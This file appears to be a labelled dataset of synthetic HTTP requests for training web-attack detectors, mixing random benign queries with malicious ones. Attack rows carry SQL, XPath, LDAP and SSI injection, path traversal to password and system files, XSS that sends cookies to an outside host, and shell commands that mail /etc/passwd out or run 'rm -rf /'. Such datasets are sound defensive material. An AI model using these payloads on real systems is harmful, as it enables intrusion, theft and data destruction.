GET,/d0ca/4oFzeOrx5V/v5sti/rPANVxZk/lZmMnR92la-5GVk/RsDiOvkRWeERb/sooZ9t/Ets2eooTtz5nrueesiK.cfm,HTTP/1.0,www.6zOsttnot.de,1,rusatduteneArk=%5C%22++%5C%3B++++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++++www.icieetristto.com+71180++++%3B&hepnolbsx2iyah=Tro%2Be&qZf5OJ4a=s&oeh=6
PUT,/9hsorr5oeyioOyA/sfecnmsrmdecd/s@2TXx6e7/sEzYJ.kLo7vV7Vu/8AYSJoFSw.sh,HTTP/1.1,78.30.51.138:3663,0,1ahn6slnTn=398&eeteNeey=78012&id3NbinYA=ebmailAw0n+p3narcpini&ontlrs87esshshi=6tef&nte165tDia5iaqW=7280454&lfxuiaUstq=ftp1emragiIrdgen&Julogg93Lh.e=621&usrQyb9u-=uoilttooab&anowdgsain=fromefT0&Ih7mashcmo=9490139471&I5nreplaceOzeORbf=0dceetciuudodeg8awgetesfOe&npv=ooi&rearlebAs=rhlib
GET,/ew4BFeTHV.emid/erepIbyrndfxuftsyat/dda/3.Av_/jr8oT9JE/0rtl/Ns/oP/BC3/_yMsselectoVv8p/ecpousmebptutgelmdbU.cgi,HTTP/1.0,www.t0risSsg.ch,1,8qm3C9rD_MF=qwer%27+++or++++oera_v.Account%3D%27tnA%40sN.com&xFF8Oogroup byP=rppklky&acqmmdedu=c57Fc1&ed9ioitehbSt=%3Ecn5iii1+i+Laccess_logs&sze=81&tlmuir0rnenWs=8&6Mtcooe6i2utanu=%2B+l
GET,/tySeWAx/rK9LyKg5t/bhL-H4u0.gtlZGsz/92ArcpbodyIstylexTOechor3/ctbgdno4mts231i1vd/nnyRraCssakatmheac/equnrRerperuom/ES4eflNj5ewbtdb/30mM2UFg/d4HJ8vOnu5DKH6ZP.h/gthsfok6et1kNtr/rcppKpzYRXAThwF.jpeg,HTTP/1.0,www.sncteghip.it,1,osma=91&goi1eyuilasisle=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd&otS=380121373
GET,/gaPdpj5.asp,HTTP/1.1,238.185.161.65,1,bezirha=la%27++++or+++count%28++path%2Fchild%3A%3Anode%28%29%5Bposition%28+++%29%3D%28%28++i+++%2Bj+%2B+++k+%2B++++l+++%2B+1%29%5D++++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++++or+%27dua%27++%3D+++%27+++++ernm%27+++++or&gtt1dehhcdb=r+yxeeasHe+0&lar=cneeuuiEnrdc2s&ecr=eE%5DgOlo%3C&ttezodjar=N+%40%26nv%5Drega%27%24o
GET,/srfTigaoet/mrnsGquThdsnh2/cPF2G9xLY/AUancss9ntP/-IlKI1VsP7iTpN/waust2peyd/FME_CmnetcatoISGf4D3/kmnm6m.JD/messaaniltsithr.shtml,HTTP/1.0,124.86.149.34,0,owuuieiemof=8&wZjes=e%25nIsock_stream+formlivareshutdown%5Care&yofnn=nYwZIX&3oksCsEi=etmfptn&ee=a70%40NC39sgtq&Zg-U.D=0%3Ehr&3salDsme1oieg=S+Tten2cdGor
GET,/allnrixetwsaeenisbey/etulurs/2wch4iogeateinmiot/y0/oacsrbatHfarudm/r1eedae5eaOodEoe49n/otPE/ohV5om/stdeietdst/enads3HmstSet8ta/hpw/ipeee6eeaeah.jpeg,HTTP/1.0,213.241.142.180,1,-_8H14c=446024&SeoidnNNleuje=b-_rSfR&etoteu=4+o+gLtp%3Cstdin&tn=achsha&Ev-VbinN_stdinrESa=149292418&aiCe=sV26ycIpVn&hOCCo.2dz=exec++xp_cmdshell+%27%22tn%22+++++%3E%3E+script.vbs%27&udssstZg9a=s1an&gi8c7thyrn=uirgS
GET,/eP/f6/pqonnectantoaQil5ciI/nbmUe/yeodsreoeaisrce/duaifjecttnOeobmeal/tdeeuhfaom4oeuhp/eoGzw/NI/to0@HTIDXF.shtml,HTTP/1.1,204.209.15.101,1,nmnae=eu%3E%29g&AatlzSrf8ssfr6f=97720420&vsbo0O=esasd%2BeAa9etdirn1&yyutan=38298371&Lpum=7053&e7tdd=+l&otA=Nss+nlvsgeMlibaeihoe&cieatsoelaetoec=217&fagbeqaniys7t=dhs
GET,/4CThnOSHC_3UkP1cKLC8/k0/aiDhbPP/oVfgWFbRvMqQxyd1S.shtml,HTTP/1.1,38.188.188.210,1,BPg0includeYV_9A=mRQHtM4138nR&aoeadeSEzma=07803&iNiECeo0pu=%3Fhtomh2dn&wttHeeletn6=wgete&o4Tpoaeeacyr=9358966213&reeN=ehavingedq&shutdownGngo=37&Zpt=Ztbo7ohsnr9es&ldawThHu5t4=e%7Cyz&teaso4xnaqsssi=10644279&rs=s0dj+%3BJhmheotysystemtwinnt-sock_streami&ttnrsetbra=8498983030&ljedmc=2a&e6zigh5tIt=hbj..u&nceoJtnm9osqaT=.%2F..%2F..%2F..%2F..%2F..%2F
GET,/bgtseAealgtecz/oF.tiff,HTTP/1.0,www.oeyshhwLd.ch,1,Svsike=%29+++%28%7C++%28+++cn%3D*o++++%27brien*++++%29%28mail++++%3D*o%27brien*%29++++
GET,/jseRtnruyceta/9i.u/tsfrw9masiebcnhg1nol/fRZy@XE.msf,HTTP/1.0,www.n4vhoiau.com,0,cilcafenir5eonh=ekf+&aEaeTt0nsey=whereshee&24VBystdiniframeformL=no&4Std=t.bcsCIGSNSb&NchildZPPsAShavingHw=lcAw&1nnn=ayht%2F&rjp=858095&O7cVdotisnimc=r8a0Zk&mcitvulzHisTz1k=36245456&5rtsngnleml=22071725&43vhSJI=0nrahhosee&bAdyfrob5n=rjl&dtodn=jEao&NaR=ahr
GET,/q8ctes3l2nfadniebr/0eNipn/e6yltT9helaoCee/kTc85_9.qjL5G/eCKasIhHHp6ibSW_N/d7aiisea/q1yPt/bKYkNo3-4u/Ud0gPacceptjDc.php3,HTTP/1.0,234.125.85.67,0,apu2eoasoas=4685&rsceno=05348&svtdoceoh=930772664&5jEt0e=524515&aFllO=1eilgismepiednneI6&ce=4cstd1das&iE=8&sqtmpGCIP=hlsYL4ec%25uygvGmochafr4ooe&presswnh=212065
GET,/shutdowndivH/c69VteI.tiff,HTTP/1.0,237.44.2.36,1,rgnahh=%3C%21--%23include+++virtual%3D%22c%3A%5Cwinnt%5Csystem.ini%22+++++--%3E
GET,/fRp/0tcaleiee/nJBps/sE5XRHRxAm/jfCIOjrpR9KAox5ouV/O0xnnBySlqheI/mhleqspahs.mdb,HTTP/1.1,142.209.125.25:80,1,75hejsndizod=oops+%3B+cat+++%2Fetc%2Fpasswd+%7C+++mail+++your%40se5e.com
GET,/ilyir41jtrot4/lR2/znilnr/stgi1nnOds/lIN1cVV9pZmRmWEz/nK-XmqzxDA.pl,HTTP/1.1,www.e6barc.uk:95241,0,tofHw83usyeI=78010&DuN8telnetr=mesamrr+hp&sidnnratsrp=window.openkl5o3lkr&yEbmr=imOxp_thtbwgetadJ+&enleOetr=21077062&pavtu5ereruet=008400&ns8eAtdwcwhdoul=veBRBtR_o5Y&n8=z8%3Fe7&nsqc=engewEeeeetjnbl&V.1xzoT=iossphr&lwmaci=104570420&8swlerlbE70ewrN=8182091288&axBtoy6=aD%26systemsu&hkdi=98
GET,/SSrM./rD-/fbbEnzc5-.Ks_ZQng/spwH8YJe/eoR8tt0t/n0tzeNosorwsepA/dpYCx8Y.BMeR6EsQyVjK/pnw.FmT-w7p3iwPlW/lGFi0bgo/hCopPweszT1XBo9x9UL/wm2awNina.shtml,HTTP/1.0,39.121.182.158,0,rttunkra=a23aYgOwooe
GET,/Gh6.IT/lHx5v3PF/NN-WJA/ouEseareeCep/Rf/hEtxxlX/6b/egulh75nvn7.php,HTTP/1.1,www.ra9sNe.ch:80,1,mteeOcld=0&coe6I6n5i=feutn
GET,/gogiinEocqhbj/alhLkbS8ygCq@I-4fCNV.php,HTTP/1.1,www.wTaeEshi.org,1,XsoTnuheIe2Ge=%3C%21--++++%23odbc+++++statement%3D++++%22select+gdi%2C++++tra%2C+++nfieuiao++++from++++m1Pbs3os++order+++++by++++9%2C++++24%2C+++++0%22++--%3E&pa=ewl&astdeneciaoi=tkhbG&fsciwQO=q53Grz8
GET,/rtdt/Xa74/torueeef/OmLlm/slIcr/b8IKY-zmT-A3yUY/mW6C6yVugPDZ/ijR/9vp7cAnpE_.html,HTTP/1.1,94.132.60.112,0,discHtqWli=o%3Edse+iN9yndis8&imgYG%ux=zSiehuNdnet&eeatyr1A=nondho5sf0ul&iprsan=afieweiWekhtytoa&heeioht=671630&ays=e+t
GET,/9lmr.dll,HTTP/1.1,www.6dsarrt.de,1,Oe6eTTimylbosa=e5iev-tdZM&oall=hsReu&gmochaLVmlV@vPRQ=acxml&1Uon5imm=563&rneghe1ssrtid=lstdinvar&ghetekhdolHSst=03927&etgmmilrtr=dnoo&yqisSj=nzTo&dlii=ie+%3CeBe4ssat&ci3unE=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&wtelnetS7J.JEKkt=si%3B-an+oo
GET,/ereeropsenAeeotmho/im/Pyie8bnoridniGi3bsNf/aGXCnUeZyNYVPIq0t/oKorcvu8/ejWWr67iz_L0NsNbLT/opz2.mdb,HTTP/1.1,www.tcknA1n.uk,0,Se4=%7E%2F
GET,/Sn4p3Mmee/u18eisr3dnh0Eaei5/aJ3ZS1/bAopenipwindow.openavvQschild/8L/fwauyjsangt/nlIollesowhad/1bl/slm/ihxlNrieLbCtf8on5s/e1nfjjgBU_ZzG.mspx,HTTP/1.1,8.147.216.12,0,25_tje5gPk=tMxF2S.MDp&teSveswhDoiibn=tHt&arWneo=logo&Solljlu9r=7oegoibin&9RPvryBup-=Vinnoemn7&he-likeTinput=2+&mrrthss=nerycfoi%3Aso&sicy=7253424531&cmocha_26vc8od0dx=thsgqe&K1Ncat2=uiohlall+%2B+aari&nSl1htaa3id=df6&ir=00331
GET,/tyCTl70B9gUOBQwP/m7lseuiura1nesitue/enatEoiniee/3s6xJLNwmrV/woixhfubtmwaau/haeu/dwZFmEUmvK2yh50-BJ/5iucegsrfea.css,HTTP/1.0,141.150.243.9,1,jta6Eo=eaeytroai&remey=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&ooVfahh=1tzpmng5eo&javf=14
PUT,/ofztFJM4PE/mw.6DF.hkOkcoQr/dx@T/tWi7@WBFWbfmJl-n-C/eN8Xr./le59nsr4i5L50Uje1krn/erzCa5q_/dBdfPl@jPwt2641shZ/4ui/xccathhus/4DRsV.bKANEgroup by-.dll,HTTP/1.1,www.iihEtd.ch,1,GalEnj5no7vt=hpva&htaccesv2qnc=01281282&Ris=../../../../../../../../../WINNT/autoexec.bat&EvHidEea=zyreplaceo/ oercfrexIe&pe=dE7YVaopM.&tJrcpn=5
GET,/EtpmegidlATpsree2/yBevsainemdms/azwS/tnlia4iafltasefdqzl/IHRGHphavingsKwzQ/MCodvLeFzi/moiogtm/ENVIP2Q7sk_Vfy/ns1LZlg9uuN/a5mcHNc/p8PupUnDRe.aspx,HTTP/1.0,41.227.20.10,0,PE2I=25&dteopEeIxsrbyC=810505&laire5=v&4kwyrlecdeo=1uahax&9s-x.IOGea=800&erexc=cbVOu&nsraverLdh2hAd0=See3sihain8h1&tatst5ds5cO=tgEiNmoox&gue7i=11189695&d7=sof&-0EIoXpassthru-_=7&eitdinssegro=92751781&peeotebne=b%5Cj+
GET,/httpRAypcAP/oRQMh@N4wajU9/o3/laf/iVyuc8y/cccbYYnaoadtDe/bzpL93/aoyxu.bin,HTTP/1.0,www.mnqseutu5.cz:265,1,cniQWcMqdocumentWIv=851607&tesurn=3620030&hheEod4mhe=y84&15iei8tdS=03&gdihoeNnte=natMj4ntew&nu=Prsat8s&ednl=t%3Fh+dJe%5Da4ie&pahenmuus=ic2t&yrITrsE=8542522414&iS=772309&ALebetweenc=aooi&nw=7556496&rghRdaTjl5t7lmo=%29+%28++++%7C+%28+++cn%3D*o++%27brien*+%29%28mail++++%3D*o++++%27brien*+++%29
GET,/iURAV/JQAdelete7k/5yoIXS2A@G5lo-4HZ9qr/6YHdQsduB/o7b/aOYJbaNVF0Pr4A_45eE/ec6ho9huriEgH.php3,HTTP/1.1,www.irvwtonw7.gov:80,0,eru=980489&urhlqasr=t&eotuwippoehem=i%25cUnn&na=4765815&iSdg=2&tnoamki=272249&ihu94lo=passthrusyE&otna=tni&wt=oelezrtOs6aUoaWah
GET,/msadc/..%5c../..%5c../..%5c/../../../winnt/system32/cmd.exe,HTTP/1.1,224.159.159.92:80,1,/c+dir
GET,/f7vNw2subygIj9/0p2pVFIeEPCbFmW2BM2.nsf,HTTP/1.1,www.oeoenni.org,1,eac27nevucofrt=1496
GET,/isahse9toea/mElxatWt1ieeoE/xp_fvy/orrlu2nsreaeespeu/.ETwj.js,HTTP/1.0,www.tbAdigp.ch:80,1,otn=%3Cbody+onload+%3D%22+%5Bwindow.open%28%27http%3A%2F%2F230.178.48.232%2Fta.swf%27%2Bdocument.cookie%29%3B%5D%22%3E&httrajooew=8123&ttg=521120823&slacwqi=eh
GET,/u0s4MQqcdQCRUC2S/reds2tcsprilatiroeee/cu2L-LFm4/mnpghiHpyz_qIb4v.2t/tva4eis86hhgN3f7.pl,HTTP/1.1,116.173.147.239:669,0,heso=1wr6iodbb&Slewaoneg=nZ9JavBV&qRdiap7ahaagi=e.J&MYfxZ9=npF7.-0fx2RT
GET,/CF_/bpjnc/amLqDnl/s7ut/mhTtuihn/at3cyi/pgoa8EleonulaeSTat0r/q9gcq@v3VWy/whereIl/system-fOvj4rcprG/4vOW1euguCFe.shtml,HTTP/1.0,254.38.47.102,1,IHKRLN-Ek=+&avonu0ow=107288&vqdJKt-YYE=7031+++++or+count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or++++89493%3D
GET,/3usiiZAe7eq/zwaxdhVuIYF3cHoA/czrNeq4C_bAE8ARg.pl,HTTP/1.1,www.3onnslIEo.gov,1,Oo0JI2G6wAicmd=%3C%21--+%23include+virtual%3D%22%2Fvar%2Flog%2Fhttpd%2Faccess.log%22--%3E&.F9baLeEq7execF=svMFYWNyB
GET,/h5ownhamlnem/hHUrcSJi3klpu0nt3uk6/RCS/tsmtU8v/osXTDKk/cid4fuetbiw/ahhoc/Kw14cesPu/eds4FTbnetbq.mdb,HTTP/1.1,www.lnwe62.org,1,6wnlnaasl=%29llogr5q&oTma7ti=gf6rEioLrco&kabseruwhbsgi=863&oXl1ij=od%7EenlUcfnhd%7Co&snsnp47tm=%3C%21--++++%23odbc+++++statement++%3D++%22select+++++c4so%2C+++ovosD%2C++tfsohir+++++from+++++tbtalse2+++++order+by+++++6%2C++++65%2C++5%22+++++--%3E&oum4i=aaeomhOs%25hisq&acetxssgSSdal7=0tordzamevalndd
GET,/fP9i3WngW1X33g/egXgItneXlJRsIkl/2QDMpidqk/aXuhfhrtsq1eedndt.php,HTTP/1.0,73.151.136.173,1,.TZK5PQidocumentc=u8lhoaReosort&ryPLn9OaYoC=290&iJwsrIfablet=gMq_SU8P.DX&en0bcv=8508&loP=389628287&i1aUSmutRAle=la8n&s5nOwndTnt=n6T%29&ktT=etcm+ep%3Ac+eiI&rofeuittashli=%27%29++UNION+++++ALL+++++SELECT++++01++++FROM++++oNr2t+WHERE++%28+%27%27%3D++%27&h3my=hkIcXWin&1winntrboot.iniNtzJ5W=962&i7=rilinkawylfromotng
PUT,/edogh/SshP85lCEmxI/tLyp.EH_m9S2/T4Bav.html,HTTP/1.1,76.102.92.166,1,bi=92&thueafteeRr2n=../../../usr/dsqqdsqsd.xml&Olpasswd.Ww.Bo=310&ofkhpe3s5yi=gQaMFIQI&d1LTy=0318219&tjr3hheio8hE=767&sPR8Z2r=c3mDx@@&AeqsRtnao=rosftrEs kel:ee&ee4cjoea=669
GET,/edohg/aBhsHBel5NIHUSRb0fnG/hkBSKuvRBQE/dBaeiaErenretlttraat/aensemlsnsduh0.php3,HTTP/1.1,www.aulddewh.it,1,Yw2ogqxya=s3soraht%27++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or++++%27hibo%27++++%3D+%27
GET,/eKl.@N.js,HTTP/1.0,102.241.119.13,1,evpiec=691&o2gia=acaconnect4&rEqubchsmlleht=+ssh&oiteaftsToiwre=tr&DZWAfYf.T=Ah+b8Ko3e%40i&tro=rdihat&winntcmdamailnEi9Te=ecrtwgetYi%25%7Ea6ohq&nst=44.225.165.193+++%7C++dir%2Bc%3A%5C&ni3tabplltc=f%2F+t&orsottnErct=WesjE
GET,/7q-upc2p/e1tran04hci/fnrE4drImfronsieeAmd/o8FjBWLq@.ewIfFBfV/zmOBo6b07bucf/nDM1uHRgFgfv.htm,HTTP/1.1,75.196.136.225:80,0,4ro=Elartne%29C+%3EE&lnisoohaSpu=694386&9aymn=fechoect&RqautoexecjPG9CS=654&jeGYJ=90603&st7nhzods=sz-Ao0j4ixPl&ixgehenz=cJSj.lYRc&aUxhD1Cj68=007288097
GET,/q96xkDZ9ENxE6nFF/ovanb2fz1s8axisdec/issOdrduyuaartOhitoo/iCIAQgwgu/eDWIeRk414fp/iT1rgsiG2WPyRZw1/ldqcMxbdL.dll,HTTP/1.1,104.117.189.173,1,T13pur@6uIchild=lLG&Uat19ucrbiclabr=t%5CtMqo1&ntoieit8octR=mEMs8PO-HX&telnetOuCl=htpasseboot.ini&eaDdtuuRStqeuId=%60++++rm+++-rf+++%2F+++++%60&yetsfeeci=94743&ohotNczyeik=likeis&7iwnuoeeade=0563176601&esw7edvPCe=6&iiIeuue=+atth
GET,/e0njioetf6t3ibt/nrc5itquxshso1hmzlld/1tTdesroaz6p/gaivz/aLdo9l9ogeb8e/1sttaamhimIbttlMs/7etilih2/tEpRterngeiraotaJzu.php4,HTTP/1.0,www.ahrl.it:98,0,aiatoHeeYreel=fs33662bZr&eeaaicn0eael=zg7o0bCXE&seo=dN2cd&akttog=woctcon9execf0d9n
GET,/b5itd/une/9script9frompHwbinsWOIlibA/iADwSqpu9B.-5h/51t84srna0Eivnr/PgqZnMNQoih/ttikyTperwerw/xVLY/r9/sae8tcadgxo.asp,HTTP/1.1,www.entotmAa.org:9207,0,bEJ=920
GET,/asPUKNCrnog/R40/le/yQICGYO/JservicesmbodyKEw/i170I/aomelAs8hointEa1oDuc.jsp,HTTP/1.0,26.16.182.51,0,toaotheedise=lpusre+%27prmsd0a+aeexecI
PUT,/lrIMPYtO_zlfO/lvsao/o9gftbA-J6tGzE9/6execIhttp9iX4EBJp/6tioa/qG9KGidbin/perxprwtmDior/oe/0ett8dejrm/tnoreo6hit0ysdi.jpg,HTTP/1.0,21.66.243.126:80,0,opNweip1stsh=btoootI&iu3hdesa0hyS=A&omb2lgs&aLaaucerdcp=as4&o3setha=6
POST,/m-vQijR5YHN/baeh/TQxm@UzPy.gif,HTTP/1.0,www.eempqx.org,1,ye=arEierneHm&JTFOUD=h7nyhalNn&oih4oot3moEo=<!--#email fromhost='www.repph0d.com' tohost='mailbox.krN7.com' message='s4iur OhnEt4 ltxeAeM i7h1s' fromaddress='ucetoT.com' toaddress='wrl5.vs.com' subject='o' s
GET,/eX40zFTSRKQ9Td/d66wTYVER2D2wOjL1o/ees2htTT4/_KExy5L07hs7R_/lSOaN0UyU./nkZd9eA.m7kwF@xjS01x/t9ps-LbpR.sh,HTTP/1.0,www.2EIifs.uk:09080,1,gr=1zas%2BhIimn8&tpGt=7980&rwxep=144&aeopus=wmmw&ynuDsEbrul0w=oeoscTc%27+++or++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++++or++%27lsd%27++++%3D++++%27&E.scriptvarKJ=su-&gb=etv0djouhkyr&ucie4ex5as=1et
POST,/ojNsD3stdin8vllocationU8/niatvrohE/hfZ/y7uUqPqA2A8pv.swf,HTTP/1.1,www.veuqlc.com:80,1,uJkO2Q=+sunnhoj&8q3h5wo=<!--     #include    virtual='/etc/passwd'     -->&id3ennoosExioic=72872&vrr=sElhq5 pghb|uaa s hn&q4fisnsu=056436&ulgntpmoAi=16905297&Vshutdown.fBxF2WU=h&r9fAiencnrD5=516973
GET,/sveneit2rqK/u6SIyd-Qo-.tiff,HTTP/1.0,www.csoazsrwto.uk,1,ntjoa3Ax=eanga1isyhhtot0&lbmt=et&ir=i&lhafuosman=arestMnoeurt4&KG7iCxBqd=oGJeKaHq8&cnr7wnesa=8TpD2ixTdu&W@acceptEqESvE8httpk=Unph-gfi7%3ChIparw&ngbd=icxaYL&mQfn9ecOcse=%29++++%28%7C%28cn%3D*o+%27brien*%29%28mail+++%3D*o++++%27brien*+%29++&ntenourh=y
GET,/msadc/..%5c../..%5c../..%5c/../../../winnt/system32/cmd.exe,HTTP/1.1,80.192.141.18,1,/c+dir
GET,/evhriIie2etbdtt/Vs03aUYaD.9/set/t7/i45n/i9uLyD5.STzeweW1cQG9/cIyrIiz@PhR0XYws6c/teE8tcherae/9inhsizsltkheorrir/nNqqK34tV1YB16/oiften/zVUX9hQ66b.asp,HTTP/1.0,www.hsml.be,0,hDih8uvzrTcqget=inputna+c
GET,/drk/larbs/_Dusrginclude/sj6GriYWI8K3/pHd9ekl7_15EjctfR9Z/i0iI3YOOOw2-8aYWh/erMqhy3swidileeh2an/eRU.vUHcH25/aGtgete1sgtAld2a/unssEnesjc/lst1ozasa/ynUin.mdb,HTTP/1.0,www.Tlrtn3.fr,1,sottugi3aykeoa=40919614&loghA=%3Cimg+++++src++%3D%22+++++javascript%3A++%5Balert+++%28%27R5ls%27%29%3B%5D%22++%3E&uw=dtmealttP&eerraTlIoea=feiBjogfka8aeWeie&yrsawaunRj=oiEzq&FHcgroup byJUQpasswdK=eetnnpa&n7le=%26i%7Eohaving&boqiadht5qyc=rFGwQOszfIL6&mno=xtermaoei
GET,/ndaoht/yLrt5zly0oq/mhFucmlAsns.htm,HTTP/1.0,www.sqr4shd.uk:80,0,8NFULIBVjFIi=nHlep2srhIeu&6te2eThumsonnee=0797616&aeiq9K=yK9E&SdeutsY8=whTwsmwt&l3oi=2595305&tecYqylaa=o4qastpOu%28i%5B+processing-instruction%2FRtm&HhIG=ea%3Dvniiiofe1%7E&lthel=cc1ecsctm4d5Dt8&0sxrttry=ehaechooztlsl&JUvDmadminmopeny0dFp=5279&46ieesWct=4%27epte
GET,/ozdh1yecwnxwnorjorn/u6eane8ti/tg7.jpeg,HTTP/1.1,www.ncn7.be:80,0,iwp-WKdocument=aowinzutowN3nuA0e&nlatf=3&mNt=9626842
GET,/isdl1fqIoDnOsomosgs/fH1B/c.6FiPmLHpj9xP.pl,HTTP/1.0,www.ilrsm4.ch:80,1,xh3=492985&eymnmeiz=aao&Mo=7&7baeFl=t6v&mmatnnwoshhd=rge5sdorrTsr&etH=hs&ssosea9=ebn5&zH4T=geS4e+%22+++++++++style%3Dleft%3Aexpression%28alert+%28%22+++eeic.Hd%22%29%29++alt+++%3D+%22&eyIs=tYA&xeyighdcw=31575062&liiej6s=oUfrS&de=8906247924&ce2sLdcAn926b=nssteKboIeijh&33aomncaOmee=eezUgdaeys%2Beua
GET,/Xanmmaa2.html,HTTP/1.0,www.sg0wT90u.ch,1,afa=dtl%29%28%26%28objectClass+++%3Didd*%29
GET,/bc/emCURE0ME8k/dytNo0mBlbllx7d5/s4xuG2zRvxNP/pWOp3kaccess_logLVX/sbE3Ndk94tG2nY/kEa8/iuttltdliora7ed/iy1nlX4nniltaso/nIThfdoc3a/c@RWBlE2_XVOfH2Ol2W8/AQLnph-WGSH7.htm,HTTP/1.1,www.oeIOmish.st,1,Ari5cttahe=6185&blsees5lNraaio=t&Te1srep7ejh=enPSCo-rIW5&sacoe2enF=%2B1adircaa%7Ces6systemrn%5Csbt&nntttokhTas=%27%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F5469%2F**%2FFROM%2F**%2FseSinedsk%2F**%2FWHERE%2F**%2F%28++++%27%27++%3D+++%27+%2F**%2F&ylegammei=071&iitllshttue=phi&n0b=OFtniot
GET,/u.BF/ms/rWm.Hjx/aegrseqrnisogOdetu/rWenhuA9aidteeaiwo.jpg,HTTP/1.1,www.wdrkao.uk,1,28IYDHSJwhere=teemmiEeoegcadteu&REAB=ea+hadmin&1bzstdin=nd%5C&if=latEtneseya8rdaPMi&ndlraa=60&lccgdjrtlS9h=5&pilw=siepd76ydwwieeo&Tk7c9=jtpssajeeye-O&FessEB=w&YZzS=503045&yonagbtud04ti=%3Cimg++++src%3D++%22++mocha%3A%5Balert++++%28%27at%27%29%3B%5D++%22%3E&srrhnTttsewdmn=vbscriptrnph-smet
GET,/positionservices-obdLbdoPjp/wHPT/2QtlP27k.pmFze3WC/5hLsQZMQjk032u6ypG/dJ2URTdt2GqePM50.DNG/hiShBb3mykzJkz/khavingcl1VlXS4B/8her/ai2reusrc7eorul99n/br@JFosYdWxc.c1X/tEz7eR2WspgrxThQbY.jsp,HTTP/1.1,204.106.119.2,1,qe3b=4cZoyZzPfwNx&kS=hsi+u&hf4lzNgtnHamgTa=i-emfofeesttos%28&uauwsnestNExs=4717345&fej=5+positionore5v%3E%29+a&Esab=0&fchesdtofs=%29%28++++%7C+%28+++cn%3D*o++++%27brien*++++%29%28mail%3D*o++%27brien*+%29&DdclydMg=hrw7nIseeIt&negrrrhusF=zmocha&tgfa=i5rb&e7eerhtsdo3tlo=m
GET,/oeeegux/tQG3cgwV0Y/8node-/eO/hhu@PbSV/antzemha/5N/mrFzxqN/aZQN/mhIv5eeof0aiUunai.mdb,HTTP/1.1,www.Enalsasaep.com,1,crli=8LZbg_2MVH&itzdadAp=o3Qc-kxcGB&dtfrlo=%3Cbgsound+++++src++++%3D+%22++++javascript%3A+++%5Balert++++%28%27zowlmN%27%29%3B%5D+%22%3E&efy=esetccdnullevbscript+eog%25e%7Co%26r%3Ee&nOAlMB_SD=uare
GET,/u0ofcIk9/g5bpHPz0BI-WBh/9cEOrpnk6m2d5aR/b6okUfd.S.jsp,HTTP/1.0,www.hluaahhie.st:80,0,ciyr1=oedoinetcatwtarukt&naEBcs=os&iUarajrrransjn=tEp-BBj&mhai3o=2
GET,/aJ6_oJ5gZO@gOGOpu.nsf,HTTP/1.0,29.36.241.1,0,b3Hh-@jMadminPDw=rlsstwl8ouqqoatiai&UIzhnoinal7ttbE=8&hbixmuch=3051
GET,/ealtjsefetste2b/Ipt/adWhPqidpy-7J/eetehtfex/9mjdI4uLxT/n4aatysweh7Lerqistu/e1/tAykxCQz9nX/eu/nk942Er0b6wmss/yltesol13v.shtml,HTTP/1.1,41.214.239.12,0,oae34eratc0E=2ydi&9echoLetcxGdf=nth9&_m-oRq82b=mQtcoFbZvgoK&7cUip=9381591
GET,/nh@U2catL6h/susiCTcrdtNRpttrhhz/eCd.OaBt-rXptnCGr/oLeoeKGe/aDkBxwuWY94/XJcatiNOO/h.YT.js,HTTP/1.0,www.slefeete.ch,1,i4rsteDasonc=ds&qfowrE0vE=igv&i2jeefmurI=%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Flaelmerich%2Fastons%2Felol%2Fng.nsf&2ra=tAfDTnandh+T&fisusblhyznax6b=eig%3DrImoW&lhTpEOpedl=sMW
PUT,/tcuvroeDdQgtZWpJOOUJ/konmw/eebntnsiffrrk8ho/Oy/cYwZJM3pLbody/tdIHEm.php,HTTP/1.0,215.229.162.107,0,estftxt=fJg&Hwceeuesse=53544&opaoa0npu=oGh4U61&ihIlidyegr5pO=ugx&B.Uas=66813982&nCLVUhome8p-=neunionyaEi4&nsn=uZQ@zIHGLTru&8qnr4B0=rr'an9elle&7X3or.LNGobz=xb&oih-=9hitcRUeuld1h&1Oal9eqOApdTesG=1&Htrnro0otry1x=itrennmeneoy&MzJETzo= veI|dre0mcmdnhttpt<&geet8nFlyotm=aa pfcopyitescripteteob&replaceinsert.wgetgHPMdivi-=keuo6sstnm
GET,/LqMc20rV6/ex8s25/vB/4_qHqqNXBKSjc/Cjxc/tbqfpXO/0YHD_8/mUO/mfcaonC395/ui.php4,HTTP/1.1,178.59.78.172,0,wemUrraorpe=eil&5t=2&TrisAaa=828103&abAtelnetP4BpvpZ=-Sue
GET,/zMaGdM1ZFKqq0d/Z89t8Dvfvw/passwdhU7zHGms/WV_sbF.m-saccess_log/euirogaEl2oeooinvoa/u0sgiuQi1iacwtia2odr/s9S-nKRPg@A/sw7lis/eoaoulr.swf,HTTP/1.1,www.oemFmflM.it,0,8vei=i9aatFtneutom&YzmN2c63=794638&arppzb2e6lrV=tq&ltt3tb=x4_Kgp&09Yqh=idl
POST,/R_IkFx/t1B4ueQuuQDe/eYtV/mEiaoHbTUFbna/crtfttTela/eaW/nFi8Bv.O/re6nore/uowalm7/eirbhngtdwGms/matseafs.jpeg,HTTP/1.1,250.162.244.164:80,1,Ogo92d4optMP1b=<!-- #include virtual='d:\\windows\\autoexec.bat'   -->
GET,/ZxtermDLFRfpkmetaV/o3sowOyN9doHkreoEOwt/yYX2dbmw_U_U7Kkt0J/6R9y./rxOEHXyuqpT/5P3_j1J-B/0FRZIgf2QQyiB9@Hi/iL0Vw2r/tefneadltS/tSaP49J0/our2krquuQcSlDfSONt.css,HTTP/1.0,www.i3aopcLat.de:8651,0,esher=ejYo8M2fKwee&2c6amfr=677&luMnunkeis7tzfr=013&mbnOaqy1gsybae=RPewherecatfeval8I+crmochai&afqe=7835&oimsheem=hpositioneehey%25e&tfseoihtcR=655&t8aaehiM4k=eMmsnm&eEn8=Lscripteet%26dls&0ecRbs=wSF8D&ksdfn2ee3iB=47
